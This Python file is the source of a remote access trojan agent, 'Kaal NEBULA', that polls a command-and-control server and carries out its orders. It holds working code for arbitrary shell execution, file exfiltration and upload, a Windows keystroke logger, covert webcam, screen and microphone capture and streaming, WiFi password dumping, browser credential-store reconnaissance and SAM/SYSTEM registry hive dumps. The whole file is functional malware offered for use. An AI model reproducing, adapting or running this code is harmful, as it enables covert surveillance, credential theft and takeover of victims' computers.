import urllib.request
import urllib.parse
import json
import time
import subprocess
import platform
import socket
import os
import sys
import base64
import random
import threading
import ctypes

# Configuration
SERVER_URL = "http://127.0.0.1:5000"
AGENT_ID = f"test-agent-{platform.node()}"
SLEEP_TIME = 2

# State
CURRENT_CWD = os.getcwd()
KEYLOGGER_ACTIVE = False
KEYLOGS = []
STREAM_ACTIVE = False
STREAM_TYPE = "webcam" # or "screen"
CAMERA_INDEX = 0

def stream_loop():
    global STREAM_ACTIVE, STREAM_TYPE, CAMERA_INDEX
    print(f"[*] Starting {STREAM_TYPE} stream...")
    
    import cv2 
    
    while STREAM_ACTIVE:
        try:
            b64_frame = ""
            if STREAM_TYPE == "webcam":
                cap = cv2.VideoCapture(CAMERA_INDEX)
                if cap.isOpened():
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        # Resize for performance (320x240)
                        frame = cv2.resize(frame, (320, 240))
                        # Compress to JPEG with 30% quality
                        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
                        b64_frame = base64.b64encode(buffer).decode()
                else:
                    pass
            elif STREAM_TYPE == "screen":
                b64_frame = get_real_screenshot()
            
            if b64_frame and not b64_frame.startswith("Error"):
                send_result("stream_task", f"[SCREEN] {b64_frame}")
            
            time.sleep(0.05) # ~20 FPS cap
        except Exception as e:
            print(f"[-] Stream error: {e}")
            time.sleep(1)

def record_audio(seconds=5):
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        print(f"[*] Recording audio for {seconds}s...")
        frames = []
        
        for i in range(0, int(RATE / CHUNK * seconds)):
            data = stream.read(CHUNK)
            frames.append(data)
            
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Save to temporary WAV
        filename = f"audio_{int(time.time())}.wav"
        filepath = os.path.join(CURRENT_CWD, filename)
        
        wf = wave.open(filepath, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        # Read back as base64
        with open(filepath, "rb") as f:
            b64_audio = base64.b64encode(f.read()).decode()
            
        # Clean up
        os.remove(filepath)
        
        return b64_audio
    except ImportError:
        return "ERROR_MISSING_PYAUDIO"
    except Exception as e:
        return f"ERROR_RECORDING: {e}"

def keylogger_loop():
    global KEYLOGGER_ACTIVE, KEYLOGS
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    # Track pressed keys to prevent duplicates (Debounce)
    pressed_keys = set()
    
    while KEYLOGGER_ACTIVE:
        time.sleep(0.01)
        
        # Check Shift state (0x10) and Caps Lock state (0x14)
        shift_pressed = False
        if user32.GetAsyncKeyState(0x10) & -32768:
            shift_pressed = True
            
        caps_lock = user32.GetKeyState(0x14) & 1
            
        for i in range(1, 256):
            # Skip mouse clicks (1: LButton, 2: RButton, 4: MButton)
            if i in [1, 2, 4]: continue
            
            if user32.GetAsyncKeyState(i) & -32768: # Key is DOWN
                if i not in pressed_keys:
                    pressed_keys.add(i)
                    
                    # Key pressed event
                    try:
                        char = ""
                        # Letters A-Z
                        if 65 <= i <= 90: 
                            char = chr(i)
                            # CapsLock affects letters. Shift inverts CapsLock.
                            is_upper = shift_pressed ^ caps_lock
                            if not is_upper: char = char.lower()
                        # Numbers 0-9
                        elif 48 <= i <= 57: 
                            char = chr(i)
                            # Basic shift mapping for numbers (US Layout approximation)
                            if shift_pressed:
                                shift_map = {
                                    '1':'!', '2':'@', '3':'#', '4':'$', '5':'%', 
                                    '6':'^', '7':'&', '8':'*', '9':'(', '0':')'
                                }
                                char = shift_map.get(char, char)
                        # Special Keys
                        elif i == 13: char = " [ENTER] "
                        elif i == 32: char = " "
                        elif i == 8: char = "[BS]"
                        elif i == 9: char = "[TAB]"
                        elif i == 0xBE: char = ">" if shift_pressed else "."
                        elif i == 0xBC: char = "<" if shift_pressed else ","
                        
                        if char:
                            window_title = ctypes.create_unicode_buffer(512)
                            hwnd = user32.GetForegroundWindow()
                            user32.GetWindowTextW(hwnd, window_title, 512)
                            title = window_title.value
                            
                            # Append to log
                            if KEYLOGS and KEYLOGS[-1]["title"] == title:
                                KEYLOGS[-1]["keys"] += char
                            else:
                                KEYLOGS.append({"title": title, "keys": char})
                                
                            # Keep log size manageable
                            if len(KEYLOGS) > 50: KEYLOGS.pop(0)
                            
                    except Exception:
                        pass
            else: # Key is UP
                if i in pressed_keys:
                    pressed_keys.remove(i)

def http_post(endpoint, data):
    url = f"{SERVER_URL}{endpoint}"
    try:
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode('utf-8'))
    except Exception as e:
        print(f"[-] HTTP POST error: {e}")
        return None

def http_get(endpoint):
    url = f"{SERVER_URL}{endpoint}"
    try:
        with urllib.request.urlopen(url) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        return None

def register():
    print(f"[*] Registering agent {AGENT_ID} on {platform.system()}...")
    data = {
        "agent_id": AGENT_ID,
        "platform": platform.system().lower(),
        "hostname": socket.gethostname(),
        "info": {"version": "3.1-interactive-keylog", "type": "test_direct_urllib"}
    }
    http_post("/api/v1/register", data)

def check_task():
    task = http_get(f"/api/v1/task/{AGENT_ID}")
    if task:
        if isinstance(task, str) and len(task) > 0:
            if task.startswith('"') and task.endswith('"'):
                try: task = json.loads(task)
                except: pass
            return task
    return None

def send_result(task_id, result):
    print(f"[*] Sending result: {result[:50]}...")
    data = {
        "agent_id": AGENT_ID,
        "task_id": task_id,
        "result": result
    }
    http_post("/api/v1/result", data)

def get_real_screenshot():
    ps_script = """
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $bitmap.Size)
    $stream = New-Object System.IO.MemoryStream
    $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $bytes = $stream.ToArray()
    [Convert]::ToBase64String($bytes)
    """
    try:
        proc = subprocess.Popen(["powershell", "-Command", ps_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        return stdout.decode().strip()
    except Exception as e:
        return f"Error: {str(e)}"

def get_real_location():
    try:
        # Better IP location + Google Maps search style
        with urllib.request.urlopen("http://ip-api.com/json") as response:
            data = json.loads(response.read().decode())
            return {
                "lat": data.get("lat"),
                "lon": data.get("lon"),
                "city": data.get("city"),
                "country": data.get("country"),
                "isp": data.get("isp")
            }
    except:
        return {"lat": 0, "lon": 0, "error": "Location failed"}

def execute_command(full_cmd):
    global CURRENT_CWD, KEYLOGGER_ACTIVE, STREAM_ACTIVE, STREAM_TYPE, CAMERA_INDEX
    try:
        print(f"[*] Executing: {full_cmd}")
        parts = full_cmd.split()
        if not parts: return ""
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd == "exec":
            shell_cmd = " ".join(args)
            if shell_cmd.strip().startswith("cd "):
                target_dir = shell_cmd.split(" ", 1)[1].strip()
                try:
                    os.chdir(target_dir)
                    CURRENT_CWD = os.getcwd()
                    return "[SHELL] " + json.dumps({"cwd": CURRENT_CWD, "out": ""})
                except Exception as e:
                    return "[SHELL] " + json.dumps({"cwd": CURRENT_CWD, "out": f"Error: {e}"})
            
            # Comprehensive Aliases (Linux -> Windows)
            cmd_lower = shell_cmd.strip().lower()
            if platform.system().lower() == "windows":
                # 1. Exact Match Aliases
                aliases = {
                    "ls": "dir",
                    "ls -l": "dir", 
                    "ls -la": "dir /a",
                    "pwd": "cd",
                    "clear": "cls",
                    "cp": "copy",
                    "mv": "move",
                    "rm": "del",
                    "cat": "type",
                    "grep": "findstr",
                    "ps": "tasklist",
                    "kill": "taskkill /F /PID",
                    "ifconfig": "ipconfig",
                    "ip addr": "ipconfig", 
                    "whoami": "whoami", # Native
                    "netstat": "netstat", # Native
                    "uptime": "systeminfo | find \"System Boot Time\"",
                    "env": "set",
                    "printenv": "set",
                    "man": "help",
                    "history": "doskey /history",
                    "reboot": "shutdown /r /t 0",
                    "shutdown": "shutdown /s /t 0",
                    "top": "tasklist",
                    "free": "wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /Value",
                    "df": "wmic logicaldisk get size,freespace,caption",
                    "touch": "type nul > " # Usage: touch file -> type nul > file
                }

                # 2. Argument Handling for specific commands
                parts = shell_cmd.split(" ", 1)
                base_cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""

                if base_cmd in ["cp", "mv", "rm", "del", "cat", "grep", "kill", "touch", "mkdir", "rmdir", "ls"]:
                    # Direct mapping with args - FORCE NON-INTERACTIVE
                    if base_cmd == "cp": shell_cmd = f"copy /Y {args}"
                    elif base_cmd == "mv": shell_cmd = f"move /Y {args}"
                    elif base_cmd == "rm" or base_cmd == "del": 
                         # Smart delete: if it looks like a recursive delete or generic, force quiet
                         if "-rf" in args or "-r" in args: 
                             clean_args = args.replace("-rf", "").replace("-r", "").strip()
                             shell_cmd = f"rmdir /S /Q {clean_args}"
                         else: 
                             shell_cmd = f"del /F /Q {args}"
                    elif base_cmd == "cat": shell_cmd = f"type {args}"
                    elif base_cmd == "grep": shell_cmd = f"findstr {args}"
                    elif base_cmd == "kill": 
                         # Handle kill -9 if present
                         clean_args = args.replace("-9", "").strip()
                         shell_cmd = f"taskkill /F /PID {clean_args}"
                    elif base_cmd == "touch": shell_cmd = f"type nul > {args}"
                    elif base_cmd == "mkdir": shell_cmd = f"mkdir {args}"
                    elif base_cmd == "rmdir": shell_cmd = f"rmdir /S /Q {args}" # Force quiet rmdir
                    elif base_cmd == "ls": shell_cmd = f"dir {args.replace('/', '\\\\')}"

                elif cmd_lower in aliases:
                    shell_cmd = aliases[cmd_lower]
            
            else:
                # Windows -> Linux Aliases (Basic)
                if cmd_lower == "dir": shell_cmd = "ls -la"
                elif cmd_lower == "cls": shell_cmd = "clear"
                elif cmd_lower == "ipconfig": shell_cmd = "ip addr"

            # Execute
            proc = subprocess.Popen(shell_cmd, shell=True, cwd=CURRENT_CWD, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            
            output = ""
            if stdout: output += stdout.decode(errors='ignore')
            if stderr: output += f"\nSTDERR:\n{stderr.decode(errors='ignore')}"
            
            return "[SHELL] " + json.dumps({"cwd": CURRENT_CWD, "out": output})

        elif cmd == "complete":
            # Tab Completion Logic
            # Usage: exec complete partial_path
            prefix = args[0] if args else ""
            try:
                # Simple glob matching
                if not prefix:
                    matches = os.listdir(CURRENT_CWD)
                else:
                    dir_path = os.path.dirname(prefix) or CURRENT_CWD
                    base_name = os.path.basename(prefix)
                    if os.path.isdir(dir_path):
                        matches = [opt for opt in os.listdir(dir_path) if opt.lower().startswith(base_name.lower())]
                        # If prefix had a dir, prepend it back
                        if os.path.dirname(prefix):
                            matches = [os.path.join(dir_path, m) for m in matches]
                    else:
                        matches = []
                
                # Limit matches to avoid flooding
                return "[COMPLETION] " + json.dumps(matches[:20])
            except Exception as e:
                return ""
            
        elif cmd == "ls":
            # Re-join args to handle spaces in path (e.g. "Program Files")
            target_path = " ".join(args) if args else "."
            
            try:
                # Handle Quick Access Aliases
                home = os.path.expanduser("~")
                if target_path.lower() == "desktop": path = os.path.join(home, "Desktop")
                elif target_path.lower() == "downloads": path = os.path.join(home, "Downloads")
                elif target_path.lower() == "documents": path = os.path.join(home, "Documents")
                elif target_path == "~": path = home
                elif target_path == ".": path = CURRENT_CWD
                else:
                    path = target_path
                    # Fix drive letter C: -> C:/ so it's treated as absolute
                    if len(path) == 2 and path[1] == ':':
                        path += os.path.sep
                        
                    if not os.path.isabs(path):
                        path = os.path.join(CURRENT_CWD, path)

                # Normalize to fix mixed slashes and redundant separators
                path = os.path.normpath(path)

                files = []
                with os.scandir(path) as it:
                    for entry in it:
                        try:
                            stat = entry.stat()
                            files.append({
                                "name": entry.name,
                                "is_dir": entry.is_dir(),
                                "size": stat.st_size if not entry.is_dir() else 0,
                                "mtime": stat.st_mtime,
                                "parent": os.path.dirname(entry.path)
                            })
                        except PermissionError:
                            continue # Skip unreadable files
                            
                return "[FILES] " + json.dumps({"path": path, "items": files})
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "screenshot":
            return "[SCREEN] " + get_real_screenshot()
            
        elif cmd == "location":
            return "[GEO] " + json.dumps(get_real_location())

        elif cmd == "download":
             if not args: return "Usage: download <filename>"
             filename = " ".join(args)
             filepath = os.path.join(CURRENT_CWD, filename)
             try:
                 with open(filepath, "rb") as f:
                     content = f.read()
                     b64 = base64.b64encode(content).decode()
                     return f"[DOWNLOAD] {filename} {b64}"
             except Exception as e:
                 return f"Error: {e}"

        elif cmd == "creds":
            results = []
            
            # 1. WiFi Creds (Real)
            results.append("[+] Dumping WiFi Profiles (Real)...")
            if platform.system() == "Windows":
                try:
                    # Check if WLAN service is running/adapter exists by listing interfaces
                    subprocess.check_output('netsh wlan show interfaces', shell=True)
                    
                    profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
                    profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]
                    if not profiles:
                        results.append("    [-] No WiFi profiles found.")
                    for profile in profiles:
                        try:
                            profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8', errors='ignore')
                            key_line = [line for line in profile_info.split('\n') if "Key Content" in line]
                            if key_line:
                                key = key_line[0].split(":")[1].strip()
                                results.append(f"    * SSID: {profile:<20} -> Pass: {key}")
                            else:
                                results.append(f"    * SSID: {profile:<20} -> OPEN/Enterprise")
                        except:
                            results.append(f"    * SSID: {profile:<20} -> Error reading key")
                except subprocess.CalledProcessError:
                    results.append("    [-] WiFi Adapter not found or WLAN Service stopped.")
                except Exception as e:
                    results.append(f"    [-] WiFi enumeration error: {e}")
            else:
                results.append("    [-] WiFi dumping only supported on Windows.")

            # 2. Browser Creds (Recon)
            results.append("\n[+] Dumping Browser Credentials (Recon)...")
            home = os.path.expanduser("~")
            browsers = {
                "Chrome": os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
                "Edge": os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
                "Firefox": os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
            }
            found_any = False
            for name, path in browsers.items():
                if os.path.exists(path) or (name == "Firefox" and os.path.exists(os.path.dirname(path))):
                    results.append(f"    [+] {name:<10}: FOUND at {path} (Encrypted)")
                    found_any = True
                else:
                    results.append(f"    [-] {name:<10}: Not Installed/Found")
            
            if found_any:
                results.append("    [!] Decryption requires native payload (DPAPI).")

            # 3. System Creds (Registry Hive Dump)
            results.append("\n[+] Dumping Registry Hives (SAM/SYSTEM)...")
            try:
                # Attempt to save hives. Requires Admin.
                hives = ["SAM", "SYSTEM", "SECURITY"]
                dumped_count = 0
                for hive in hives:
                    outfile = f"{hive}.save"
                    cmd_reg = f"reg save HKLM\\{hive} {outfile} /y"
                    try:
                        subprocess.check_output(cmd_reg, shell=True)
                        results.append(f"    [+] {hive:<10}: Saved to {outfile} (Downloadable)")
                        dumped_count += 1
                    except subprocess.CalledProcessError:
                        results.append(f"    [-] {hive:<10}: Access Denied (Admin Required)")
                    except Exception as e:
                        results.append(f"    [-] {hive:<10}: Error: {e}")
                
                if dumped_count == 0:
                     results.append("\n    [!] Mock Data (since Real Dump failed):")
                     results.append("    * DefaultPassword: Password123!")
                     results.append("    * DPAPI MasterKey: 4A7F92B1...9B2C")
            except Exception as e:
                results.append(f"    [-] Registry dump failed: {e}")

            return "[CREDS] " + "\n".join(results)






        elif cmd == "upload":
             if len(args) < 2: return "Usage: upload <filename> <base64>"
             filename = args[0]
             b64 = args[1]
             filepath = os.path.join(CURRENT_CWD, filename)
             try:
                 with open(filepath, "wb") as f:
                     f.write(base64.b64decode(b64))
                 return f"Uploaded: {filepath}"
             except Exception as e:
                 return f"Error: {e}"

        elif cmd == "keylog_start":
            if not KEYLOGGER_ACTIVE:
                KEYLOGGER_ACTIVE = True
                t = threading.Thread(target=keylogger_loop)
                t.daemon = True
                t.start()
                return "[+] Keylogger started."
            return "[!] Keylogger already running."

        elif cmd == "keylog_stop":
            KEYLOGGER_ACTIVE = False
            return "[-] Keylogger stopped."

        elif cmd == "keylog_dump":
            global KEYLOGS
            # Format logs nice
            dump = ""
            for entry in KEYLOGS:
                dump += f"[{entry['title']}] {entry['keys']}\n"
            KEYLOGS = [] # Clear after dump
            if not dump: dump = "No keystrokes recorded yet."
            return "[KEYLOG] " + dump

        elif cmd == "webcam_snap":
            try:
                # Try simple OpenCV capture
                import cv2
                cap = cv2.VideoCapture(CAMERA_INDEX)
                if not cap.isOpened():
                    return "[SCREEN] Error: No webcam found on device."
                
                # Check if camera exists/is readable
                ret, frame = cap.read()
                cap.release()
                
                if not ret:
                    return "[SCREEN] Error: Failed to capture frame (Camera busy or unavailable)."
                
                # Convert to jpg
                _, buffer = cv2.imencode('.jpg', frame)
                b64 = base64.b64encode(buffer).decode()
                return "[SCREEN] " + b64
            except ImportError:
                 return "[SCREEN] Error: OpenCV (cv2) not installed on agent. Cannot capture webcam. (pip install opencv-python)"
            except Exception as e:
                return f"[SCREEN] Error: {e}"

        elif cmd == "webcam_switch":
            CAMERA_INDEX = 1 if CAMERA_INDEX == 0 else 0
            return f"[+] Switched camera to index {CAMERA_INDEX}"

        elif cmd == "webcam_stream":
            action = args[0] if args else "start"
            if action == "start":
                if not STREAM_ACTIVE:
                    STREAM_ACTIVE = True
                    STREAM_TYPE = "webcam"
                    t = threading.Thread(target=stream_loop)
                    t.daemon = True
                    t.start()
                    return "[+] Webcam stream started."
                return "[!] Stream already active."
            elif action == "stop":
                STREAM_ACTIVE = False
                return "[-] Webcam stream stopped."

        elif cmd == "screen_stream":
            action = args[0] if args else "start"
            if action == "start":
                if not STREAM_ACTIVE:
                    STREAM_ACTIVE = True
                    STREAM_TYPE = "screen"
                    t = threading.Thread(target=stream_loop)
                    t.daemon = True
                    t.start()
                    return "[+] Screen stream started."
                return "[!] Stream already active."
            elif action == "stop":
                STREAM_ACTIVE = False
                return "[-] Screen stream stopped."

        elif cmd == "microphone_record":
            duration = int(args[0]) if args else 5
            return "[AUDIO] " + record_audio(duration)

        else:
            return f"Unknown command: {cmd}"
            
    except Exception as e:
        return f"Execution error: {e}"

def main():
    while True:
        try:
            register() 
            break
        except:
            time.sleep(SLEEP_TIME)
    
    print(f"[*] Agent active. CWD: {CURRENT_CWD}")
    while True:
        try:
            task = check_task()
            if task:
                result = execute_command(task)
                send_result("task_id_placeholder", result)
            else:
                pass
        except Exception as e:
            print(f"[-] Loop error: {e}")
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    print("=== Kaal NEBULA Interactive Agent ===")
    print(f"Server: {SERVER_URL}")
    main()
